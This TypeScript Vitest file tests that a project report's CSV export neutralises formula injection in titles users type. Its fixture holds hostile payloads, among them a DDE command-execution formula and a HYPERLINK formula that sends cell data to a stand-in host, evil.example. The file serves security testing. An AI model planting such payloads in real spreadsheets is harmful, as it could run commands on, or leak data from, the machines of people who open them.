import { describe, expect, it } from "vitest";
import { buildReportCsv } from "@/features/reports/report-csv";
import { createTranslator } from "@/lib/i18n/translate";

/**
 * SEC-028: the report spreadsheet carries text members typed (task, blocker,
 * decision, risk and milestone titles). A value that starts like a formula
 * must reach the spreadsheet as text, never as something Excel runs.
 */

const t = createTranslator("en");

// A minimal RFC 4180 reader, so the assertions look at fields, not raw text.
function fields(csv: string): string[] {
  const out: string[] = [];
  let field = "";
  let quoted = false;
  const body = csv.replace(/^﻿/, "");
  for (let i = 0; i < body.length; i++) {
    const c = body[i];
    if (quoted) {
      if (c === '"' && body[i + 1] === '"') { field += '"'; i++; }
      else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { out.push(field); field = ""; }
    else if (c === "\r" && body[i + 1] === "\n") { out.push(field); field = ""; i++; }
    else field += c;
  }
  if (field) out.push(field);
  return out;
}

const hostile = {
  project: { name: "Atelier", outcome: "x", health: "on_track" },
  progress: { percent: 0, completed: 0, total: 0 },
  metrics: { "=cmd|' /C calc'!A0": 3 },
  blockers: [{ title: "=1+1", reason: "@SUM(A1:A2)" }],
  decisions: [{ title: "+HYPERLINK(\"https://evil.example/?d=\"&A1,\"Open\")" }],
  milestones: [{ name: "-2+3", due_date: "2026-11-01" }],
  tasks: [{ title: "\tTab", status: "todo" }, { title: "\rReturn", status: "todo" }],
};

describe("report CSV (SEC-028)", () => {
  it("neutralises a formula in a blocker title", () => {
    const csv = buildReportCsv({ title: "Report", version: 1, generatedAt: "2026-10-22T00:00:00Z", snapshot: hostile, t });
    expect(fields(csv)).toContain("'=1+1");
  });

  it("leaves no field starting with = + - @ tab or carriage return", () => {
    const csv = buildReportCsv({ title: "=Report", version: 1, generatedAt: "2026-10-22T00:00:00Z", snapshot: hostile, t });
    const risky = fields(csv).filter((f) => /^[=+\-@\t\r]/.test(f));
    expect(risky).toEqual([]);
  });

  it("is a document Excel opens cleanly: byte-order mark and CRLF line ends", () => {
    const csv = buildReportCsv({ title: "Report", version: 2, generatedAt: "2026-10-22T00:00:00Z", snapshot: hostile, t });
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv).toContain("\r\n");
    expect(csv.replace(/\r\n/g, "")).not.toMatch(/\n/);
  });

  it("keeps the project name and metric numbers readable", () => {
    const csv = buildReportCsv({
      title: "Atelier report", version: 1, generatedAt: "2026-10-22T00:00:00Z",
      snapshot: { ...hostile, metrics: { done: 4, late: -1 } }, t,
    });
    const all = fields(csv);
    expect(csv).toContain("Atelier");
    expect(all).toContain("4");
    expect(all).toContain("-1");
  });
});
